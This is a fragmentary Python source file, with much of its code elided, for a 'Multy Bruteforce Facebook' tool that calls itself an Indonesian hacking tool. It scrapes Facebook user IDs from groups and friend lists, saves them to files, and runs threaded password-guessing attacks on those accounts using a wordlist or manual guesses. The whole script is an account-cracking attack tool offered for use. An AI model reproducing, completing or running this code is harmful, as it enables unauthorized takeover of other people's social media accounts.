...
try:
	...
	tampil('\rm[!]Some Module \rcmechanize\rm not installed...')
	os.sys.exit()
def keluar():
	simpan()
	tampil('\rm[!]Keluar')
	...
	while 1:
		...
		if v:
			if a.upper() in v:
				...
				tampil('\rm[!]entry the Opsi Brother...')
				continue
		else:
			if len(a) == 0:
				tampil('\rm[!]insert with correctly')
				continue
			else:
				break
	return a
...
def simpan():
	if len(id_bgroup) != 0:
		tampil('\rh[*]saving results of group')
		try:
			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
			tampil('\rh[!]Succesfully saving \rcMBFbgroup.txt')
		except:
			tampil('\rm[!]saving failed')
	if len(id_bteman) != 0:
		tampil('\rh[*]saving results daftar Teman...')
		try:
			open(os.sys.path[0]+'/MBFbteman.txt','w').write('\n'.join(id_bteman))
			tampil('\rh[!]saving succes \rcMBFbgteman.txt')
		except:
			tampil('\rm[!]failed saving')
def buka(d):
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		tampil('\rm[!]your ACCOUNT must\n\rk[!] Login with opera mini OR facebook to identified this is you')
		keluar()
	else:
...
def saring_id_group0():
	...
	while 1:
		...
		try:
			...
			tampil('\rm[!]Id yang anda masukan WRONG')
			continue
	tampil('\rh[*]taking Id dari group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rh[*]Login first boss...')
		login()
		if log == 0:
			keluar()
	...
	while 1:
		...
		try:
			...
			tampil('\rm[!]only have take \rh %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?]lets direct Crack, press y (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
def idteman():
	...
	try:
		...
		if len(id_teman) != 0:
			tampil('\rm[!]Only take  \rp%d id'%len(id_bteman))
		else:
			tampil('\rm[!]Batal')
			keluar()
	while 1:
		...
		try:
			...
			tampil('\rm[!]onli can take \rp%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('[?]direct Crack, press y (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
class mt(threading.Thread):
    ...
    def run(self):
        ...
        if 'm_sess' in data.url or 'save-device' in data.url:
            ...
            self.a = 0
def crack(d):
	i = inputD('[?]use Passwordlist or your Manual type,recommended type m (p/m)',['P','M'])
	if i.upper() == 'P':
		while 1:
			dir = inputD('[?]insert directory file')
			try:
				D = open(dir,'r').readlines()
			except:
				tampil('\rm[!]failed open \rk%s'%dir)
				continue
			break
		tampil('\rh[*]startin crack with \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]you dont have results?,do you want to try again(y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
...
def crack0(data,sandi,p):
	...
	if p:
		i = inputD('[?]dont show result?,do you want try again(y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(data)
		else:
			return menu()
...
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?]Riset previous Id Teman/lanjut, recommended= type r (r/l)',['R','L'])
		if i.upper() == 'L':
...
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?]Riset previous Id Group/lanjut, recommended= type r (r/l)',['R','L'])
		if i.upper() == 'L':
...
\rk###########################################################
#             \rb*MULTY BRUTEFORCE FACEBOOK*\by tufail                 #
...
#       \rmINDONESIA TOOLS hack, if you want more, visit groups \tufail#
###########################################################''')
